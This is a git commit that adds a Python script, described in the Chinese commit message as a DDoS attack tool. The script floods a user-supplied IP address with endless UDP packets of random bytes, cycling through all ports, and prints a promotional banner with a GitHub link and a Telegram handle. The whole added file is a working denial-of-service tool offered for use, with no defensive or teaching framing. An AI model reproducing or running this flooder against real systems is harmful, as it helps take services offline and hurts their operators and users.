09596bbb3c85cb23826680552386407e9cb9c889
Javx-CV <3984658292@qq.com>
2025-05-17 18:05:13 +0800

    Python-DDOS-Some
    DDos-攻击
    什么是 DDos 攻击
    分布式拒绝服务 （DDoS） 攻击是指试图使在线服务不可用
    通过来自多个来源的流量压倒它。他们以各种重要资源从银行到新闻网站为目标，并提出了确保人们能够发布和访问重要信息的重大挑战

---
+++ ddos-dark_matter（带UI）.py
@@ -0,0 +1,54 @@
+import sys
+import os
+import time as t
+import socket
+import random as r
+
+from datetime import datetime
+
+print("Wait.....")
+t.sleep(3)
+random_print = r.randint(37,100)
+for x in range(random_print):
+     print()
+     t.sleep(0.05)
+print(random_print)
+
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = r._urandom(1490)
+
+print("""----------------------------------------------
+0       000 0       000 000     000 00       00
+0  0000   0 0  0000   0 0   000   0 0  00000  0
+0  00000  0 0  00000  0 0  00000  0 0        00
+0  00000  0 0  00000  0 0  00000  0 0000000   0
+0  0000   0 0  0000   0 0   000   0 0   000   0
+0        00 0        00 000     000 00       00
+----------- ----------- ----------- -----------""")
+print()
+print("github   : https://github.com/AndkCqX/DDOS-Cor-X-AndkCqX")
+print("Telegram : @AndkCq")
+print("           CQ or DrakMatter | From Cor X")
+print()
+ip = input("IP : ")
+port = int(input("Speed : "))
+os.system("clear")
+os.system("figlet Attack Starting")
+print("Starting......")
+t.sleep(2)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
+     if port == 65534:
+       port = 1
+
